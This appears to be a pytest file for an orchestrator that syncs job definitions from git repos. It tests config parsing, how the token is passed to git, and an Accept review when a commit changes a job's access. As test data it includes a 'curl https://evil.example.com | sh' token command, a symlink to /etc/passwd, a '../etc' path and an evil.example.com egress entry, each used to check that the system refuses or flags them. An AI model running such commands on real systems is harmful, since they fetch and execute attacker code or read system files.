"""Job sources (orchestrator/sources.py): git repos of jobs, synced into the orchestrator's state."""

import os
import subprocess

import pytest
from fastapi.testclient import TestClient

from orchestrator import sources as sources_module
from orchestrator.app import create_app
from orchestrator.jobs import JobRunner
from orchestrator.sources import JobSources, Source, SourcesError, parse

from .test_orchestrator import CHANGE, FakeBackend, _jobs_dir


def _git(repo, *args):
    return subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@example.com",
                           "-c", "commit.gpgsign=false", *args],
                          check=True, capture_output=True, text=True).stdout.strip()


def _repo(tmp_path, jobs=("digest",), folder="jobs", branch="main"):
    repo = tmp_path / "jobs-repo"
    repo.mkdir()
    _git(repo, "init", "-q", "-b", branch)
    for name in jobs:
        _add(repo, f"{folder}/{name}" if folder else name)
    (repo / "README.md").write_text("my jobs\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "jobs")
    return repo


def _add(repo, where, prompt="do it"):
    path = repo / where
    path.mkdir(parents=True, exist_ok=True)
    (path / "job.toml").write_text("")
    (path / "prompt.md").write_text(prompt)


def _commit(repo, message="more"):
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", message)
    return _git(repo, "rev-parse", "HEAD")


def _sources(tmp_path, *configured, **kwargs):
    return JobSources(tmp_path / "state" / "sources", tmp_path / "state" / "job-sources.json", list(configured), **kwargs)


@pytest.mark.parametrize("value, expected", [
    ("https://github.com/you/jobs.git", [Source("jobs", "https://github.com/you/jobs.git")]),
    ("work=https://git.example.com/team/Ops_Jobs.git#release:jobs/daily\n  https://github.com/you/My.Jobs",
     [Source("work", "https://git.example.com/team/Ops_Jobs.git", "release", "jobs/daily"),
      Source("my-jobs", "https://github.com/you/My.Jobs")]),
    ("", []),
])
def test_the_configuration_names_repos_with_a_branch_and_folder(value, expected):
    assert parse(value) == expected


@pytest.mark.parametrize("value, error", [
    ("http://github.com/you/jobs.git", "https://"),
    ("https://you:secret@github.com/you/jobs.git", "no user or password"),
    ("https://github.com/you/jobs.git#main:../etc", "path inside the repo"),
    ("https://github.com/you/jobs.git#-x", "not a branch"),
    ("https://a.example.com/jobs https://b.example.com/jobs", "two sources are named jobs"),
    ("Bad_Name=https://a.example.com/jobs", "https://"),  # not a name, so taken as the URL
])
def test_the_configuration_s_mistakes_are_refused(value, error):
    with pytest.raises(SourcesError, match=error):
        parse(value)


def test_a_repo_is_synced_one_commit_at_a_time_and_runs_say_which(tmp_path):
    repo = _repo(tmp_path)
    store = _sources(tmp_path, Source("mine", str(repo), path="jobs"))
    first = _git(repo, "rev-parse", "HEAD")
    assert store.sync() == {"mine": {"checked": store.status["mine"]["checked"],
                                     "synced": store.status["mine"]["synced"], "error": ""}}
    assert store.commit("mine") == first
    # A job new to the repo waits for Accept before it is one of the jobs.
    (source, folder), = store.directories()
    assert folder == store.root / "mine" / "jobs" and not list(folder.iterdir())
    assert [(w["job"], w["commit"], w["new"]) for w in store.waiting()] == [("digest", first, True)]
    store.accept("mine", "digest", first, user="brian")
    assert (folder / "digest" / "prompt.md").is_file() and store.waiting() == []
    assert store.origin(folder / "digest") == ("mine", first)
    assert store.origin(tmp_path) is None
    assert not (store.root / "mine" / "trees" / first / ".git").exists()  # the files at that commit, not a checkout

    # A new commit: unpacked beside the last, which is kept for a run copying it; the one before that goes.
    _add(repo, "jobs/watcher")
    second = _commit(repo)
    store.sync("mine")
    assert store.commit("mine") == second and store.origin(folder / "digest") == ("mine", second)
    (repo / "jobs" / "watcher" / "prompt.md").write_text("changed")
    third = _commit(repo)
    store.sync("mine")
    assert sorted(p.name for p in (store.root / "mine" / "trees").iterdir()) == sorted([second, third])
    row = store.listing()["sources"][0]
    assert row["jobs"] == ["digest"] and row["waiting"] == ["watcher"]
    store.accept("mine", "watcher", third)
    assert store.listing()["sources"][0]["jobs"] == ["digest", "watcher"]
    # Nothing new: nothing changes.
    store.sync("mine")
    assert store.commit("mine") == third


def test_the_default_branch_is_used_unless_one_is_named(tmp_path):
    repo = _repo(tmp_path, branch="trunk")
    _git(repo, "switch", "-q", "-c", "next")
    _add(repo, "jobs/only-on-next")
    nxt = _commit(repo)
    _git(repo, "switch", "-q", "trunk")
    store = _sources(tmp_path, Source("default", str(repo), path="jobs"), Source("next", str(repo), "next", "jobs"))
    store.sync()
    assert store.commit("next") == nxt and store.commit("default") == _git(repo, "rev-parse", "trunk")


@pytest.mark.parametrize("make, error", [
    (lambda repo: os.symlink("/etc/passwd", repo / "jobs" / "digest" / "passwd"), "could not be unpacked"),
    (lambda repo: None, "not a folder"),
])
def test_what_is_wrong_with_a_repo_is_said_and_its_jobs_stay_as_they_were(tmp_path, make, error):
    repo = _repo(tmp_path)
    store = _sources(tmp_path, Source("mine", str(repo), path="jobs" if "unpacked" in error else "nope"))
    if "unpacked" in error:
        make(repo)
        _commit(repo)
    status = store.sync()["mine"]
    assert error in status["error"] and "synced" not in status and store.commit("mine") == ""
    missing = _sources(tmp_path, Source("gone", str(tmp_path / "no-such-repo")))
    assert missing.sync()["gone"]["error"]


def test_the_token_goes_to_git_in_its_environment_never_its_arguments(tmp_path, monkeypatch):
    calls = []

    def fake_run(argv, **kwargs):
        calls.append((argv, kwargs["env"]))
        return subprocess.CompletedProcess(argv, 128, b"", b"fatal: Authentication failed for 'https://...'")

    monkeypatch.setattr(sources_module.subprocess, "run", fake_run)
    monkeypatch.setenv("JOBS_GIT_TOKEN", "s3cret-token")
    store = _sources(tmp_path, Source("mine", "https://git.example.com/you/jobs.git", "main"))
    error = store.sync()["mine"]["error"]
    assert "is JOBS_GIT_TOKEN set" in error and "s3cret" not in error
    argv, env = calls[-1]
    assert not any("s3cret" in a or "Authorization" in a for a in argv)
    assert env["GIT_CONFIG_KEY_0"] == "http.extraHeader" and env["GIT_CONFIG_VALUE_0"].startswith("Authorization: Basic ")
    assert env["GIT_TERMINAL_PROMPT"] == "0"
    # A local repo is never sent the token.
    calls.clear()
    _sources(tmp_path, Source("local", str(tmp_path), "main")).sync()
    assert all("GIT_CONFIG_KEY_0" not in env for _, env in calls)


def test_repos_saved_in_settings_are_synced_and_their_jobs_run_from_their_commit(tmp_path, monkeypatch):
    from orchestrator import launch as launch_module

    root, job = _jobs_dir(tmp_path)  # digest and watcher, in a directory
    repo = _repo(tmp_path, jobs=("watcher", "report"))
    configured = Source("team", "https://git.example.com/team/jobs.git", "main")
    store = _sources(tmp_path, configured)
    runner = JobRunner([root], sources=store)
    test = TestClient(create_app(FakeBackend(), runner), base_url="http://127.0.0.1:8700")

    saved = test.put("/api/settings/job-sources/mine", headers=CHANGE, json={"url": str(repo), "path": "jobs"})
    head = _git(repo, "rev-parse", "HEAD")
    assert saved.status_code == 200 and saved.json()["message"] == (
        f"mine is at {head[:12]}: no jobs. Waiting for your Accept in the Jobs tab: report, watcher.")
    assert [w["job"] for w in test.get("/api/jobs").json()["waiting"]] == ["report", "watcher"]
    for name in ("report", "watcher"):
        accepted = test.post("/api/settings/job-sources/mine/accept", headers=CHANGE, json={"job": name, "commit": head})
        assert accepted.status_code == 200, accepted.json()
    listed = {j["name"]: j for j in test.get("/api/jobs").json()["jobs"]}
    assert sorted(listed) == ["digest", "report", "watcher"]
    assert listed["report"]["source"] == {"name": "mine", "commit": head}
    assert "source" not in listed["watcher"]  # the directory's watcher is found first...
    assert listed["watcher"]["also_in"] == [f"source mine at {head[:12]}"]  # ...and the repo's is left out
    rows = {r["name"]: r for r in test.get("/api/settings/job-sources").json()["sources"]}
    assert rows["mine"]["jobs"] == ["report"] and rows["mine"]["left_out"] == ["watcher"]
    assert rows["mine"]["origin"] == "settings" and rows["mine"]["token"] == "JOBS_GIT_TOKEN"
    assert rows["team"]["origin"] == "configuration" and rows["team"]["commit"] == ""

    # A run copies the job at that commit into its record, and says where it came from.
    started = []

    class FakeProcess:
        def __init__(self, argv, **kwargs):
            started.append((argv, kwargs["env"]))

        def wait(self):
            pass

    with monkeypatch.context() as patched:  # Popen is subprocess's, which syncing uses too
        patched.setattr(launch_module.subprocess, "Popen", FakeProcess)
        run_id = test.post("/api/jobs/report/run", headers=CHANGE).json()["run"]
    (argv, env), = started
    cfg = job.config(job.load(runner.discover()["report"]))
    assert argv[-1] == str(job.runs_dir(cfg, "report") / run_id / "report")
    assert (job.runs_dir(cfg, "report") / run_id / "report" / "prompt.md").read_text() == "do it"
    assert env[job.SOURCE_ENV] == f"mine@{head}"

    # The configuration's cannot be changed or removed here; a saved one can.
    assert "configuration" in test.put("/api/settings/job-sources/team", headers=CHANGE,
                                       json={"url": str(repo)}).json()["error"]
    assert test.delete("/api/settings/job-sources/team", headers=CHANGE).status_code == 400
    assert test.post("/api/settings/job-sources/mine/sync", headers=CHANGE).status_code == 200
    assert test.delete("/api/settings/job-sources/mine", headers=CHANGE).status_code == 200
    assert "report" not in [j["name"] for j in test.get("/api/jobs").json()["jobs"]]
    assert not (store.root / "mine").exists()
    assert test.put("/api/settings/job-sources/bad", headers=CHANGE,
                    json={"url": "http://example.com/x"}).status_code == 400


def test_a_run_records_the_commit_its_job_came_from(tmp_path, monkeypatch, capsys):
    from harness import job

    monkeypatch.setenv(job.SOURCE_ENV, "mine@" + "a" * 40)
    path = tmp_path / "digest"
    path.mkdir()
    (path / "job.toml").write_text('engine = "claude-code"\n')
    (path / "prompt.md").write_text("x")
    spec = job.load(path)
    cfg = job.config(spec)

    def broken(cfg, spec):
        raise job.containers.ContainerError("no image")

    job.run(spec, cfg, acquire=broken)
    assert job.list_runs(cfg, "digest")[0]["source"] == {"name": "mine", "commit": "a" * 40}


def test_the_credential_a_repo_is_read_with_is_offered_in_settings_and_can_be_another(tmp_path, monkeypatch):
    from cryptography.fernet import Fernet

    from harness import credentials
    from orchestrator.settings import CredentialStore

    monkeypatch.setattr(credentials, "_stored", {})  # what this test stores is not other tests'

    store = _sources(tmp_path, Source("team", "https://git.example.com/team/jobs.git", "main"))
    store.set("mine", {"url": "https://git.example.com/me/jobs.git", "token": "MY_JOBS_TOKEN"})
    settings = CredentialStore(tmp_path / "credentials.enc", Fernet.generate_key())
    test = TestClient(create_app(FakeBackend(), JobRunner([], sources=store), settings=settings),
                      base_url="http://127.0.0.1:8700")
    rows = {c["name"]: c for c in test.get("/api/settings/credentials").json()}
    assert "JOBS_GIT_TOKEN" in rows and "Reads the git repos of jobs" in rows["JOBS_GIT_TOKEN"]["use"]
    assert "MY_JOBS_TOKEN" in rows
    assert test.put("/api/settings/credentials/MY_JOBS_TOKEN", headers=CHANGE, json={"value": "t"}).status_code == 200
    assert {r["name"]: r["token_set"] for r in store.listing()["sources"]} == {"team": False, "mine": True}


# --- review: a commit that changes a job's access waits for Accept ---


def _write(repo, where, toml, prompt=None):
    (repo / where / "job.toml").write_text(toml)
    if prompt is not None:
        (repo / where / "prompt.md").write_text(prompt)
    return _commit(repo)


def test_a_commit_changing_a_jobs_access_waits_and_the_job_runs_as_accepted_meanwhile(tmp_path):
    repo = _repo(tmp_path)
    store = _sources(tmp_path, Source("mine", str(repo), path="jobs"))
    runner = JobRunner([], sources=store)
    first = _write(repo, "jobs/digest", '[job]\ntrigger = "manual"\n', "v1")
    store.sync()
    store.accept("mine", "digest", first, user="brian")

    # The prompt, the schedule and memory are not its access: straight through.
    second = _write(repo, "jobs/digest", '[job]\ntrigger = "0 7 * * *"\nmemory = true\n', "v2")
    store.sync()
    assert runner.discover()["digest"].joinpath("prompt.md").read_text() == "v2" and store.waiting() == []
    assert store.review("mine")["accepted"]["digest"]["by"] == "brian"  # still the one who accepted its access

    # A secret is: the job stays at the last accepted commit, its new prompt too, until someone accepts.
    secret = '[job.secrets.mail]\nenv = "MAIL_TOKEN"\nhost = "mail.example.com"\n'
    third = _write(repo, "jobs/digest", '[job]\ntrigger = "0 7 * * *"\nmemory = true\n' + secret, "v3")
    store.sync()
    assert runner.discover()["digest"].joinpath("prompt.md").read_text() == "v2"
    (waiting,) = store.waiting()
    assert waiting["commit"] == third and not waiting["new"]
    assert waiting["changes"] == [{"setting": "[job] secrets", "before": None,
                                   "after": {"mail": {"env": "MAIL_TOKEN", "host": "mail.example.com"}}}]
    item = runner.jobs()[0]
    assert item["source"] == {"name": "mine", "commit": second} and item["review"]["commit"] == third
    assert second in os.listdir(store.root / "mine" / "trees")  # kept while the job is held at it

    # What is accepted is what was seen: a newer change has to be looked at first.
    fourth = _write(repo, "jobs/digest", 'egress_allow = ["api.example.com"]\n[job]\ntrigger = "0 7 * * *"\n'
                    'memory = true\n' + secret, "v4")
    store.sync()
    with pytest.raises(SourcesError, match="changed again"):
        store.accept("mine", "digest", third)
    assert [c["setting"] for c in store.waiting()[0]["changes"]] == ["[job] secrets", "egress_allow"]  # vs accepted
    store.accept("mine", "digest", fourth, user="brian")
    assert runner.discover()["digest"].joinpath("prompt.md").read_text() == "v4"
    assert store.origin(runner.discover()["digest"]) == ("mine", fourth)
    with pytest.raises(SourcesError, match="Nothing of digest waits"):
        store.accept("mine", "digest", fourth)

    # A change back to what was accepted needs nothing; a job gone from the repo is gone.
    _write(repo, "jobs/digest", 'egress_allow = ["api.example.com", "evil.example.com"]\n[job]\n'
           'trigger = "0 7 * * *"\nmemory = true\n' + secret)
    store.sync()
    assert len(store.waiting()) == 1
    _write(repo, "jobs/digest", 'egress_allow = ["api.example.com"]\n[job]\ntrigger = "0 7 * * *"\n'
           'memory = true\n' + secret, "v6")
    store.sync()
    assert store.waiting() == [] and runner.discover()["digest"].joinpath("prompt.md").read_text() == "v6"
    (repo / "jobs" / "README.md").write_text("no jobs for now\n")  # the folder stays
    _git(repo, "rm", "-rq", "jobs/digest")
    _commit(repo)
    store.sync()
    assert "digest" not in runner.discover() and store.review("mine")["accepted"] == {}


@pytest.mark.parametrize("before, after, setting", [
    ("", 'token_command = "curl https://evil.example.com | sh"\n', "token_command"),  # a harness setting
    ('[job]\noutput = ["stdout"]\n', '[job]\noutput = ["slack:#general"]\n', "[job] output"),
    ('[job]\nmode = "report"\n', '[job]\nmode = "act"\napply = "sh scripts/apply.sh"\n', "[job] apply"),
    ("[job.secrets.api]\nenv = \"API_TOKEN\"\nhost = \"api.example.com\"\nca_file = \"ca.pem\"\n", None, "file ca.pem"),
    ("", "not toml [", "job.toml"),
])
def test_what_counts_as_a_jobs_access(tmp_path, before, after, setting):
    repo = _repo(tmp_path)
    (repo / "jobs" / "digest" / "ca.pem").write_text("CA one")
    store = _sources(tmp_path, Source("mine", str(repo), path="jobs"))
    first = _write(repo, "jobs/digest", before)
    store.sync()
    store.accept("mine", "digest", first)
    if after is None:  # the file a setting names changes, not the setting
        (repo / "jobs" / "digest" / "ca.pem").write_text("CA two")
        _commit(repo)
    else:
        _write(repo, "jobs/digest", after)
    store.sync()
    assert setting in [c["setting"] for c in store.waiting()[0]["changes"]]


def test_a_repo_synced_before_the_review_keeps_its_jobs_as_they_were(tmp_path):
    repo = _repo(tmp_path, jobs=("digest", "watcher"))
    head = _git(repo, "rev-parse", "HEAD")
    store = _sources(tmp_path, Source("mine", str(repo), path="jobs"))
    store.sync()
    # As an orchestrator from before the review left it: a current commit, no review, no links.
    (store.root / "mine" / "review.json").unlink()
    for link in (store.root / "mine" / "jobs").iterdir():
        link.unlink()
    (store.root / "mine" / "jobs").rmdir()
    again = _sources(tmp_path, Source("mine", str(repo), path="jobs"))
    assert sorted(JobRunner([], sources=again).discover()) == ["digest", "watcher"] and again.waiting() == []
    assert again.review("mine")["accepted"]["digest"] == {**again.review("mine")["accepted"]["digest"],
                                                          "commit": head, "baseline": True}
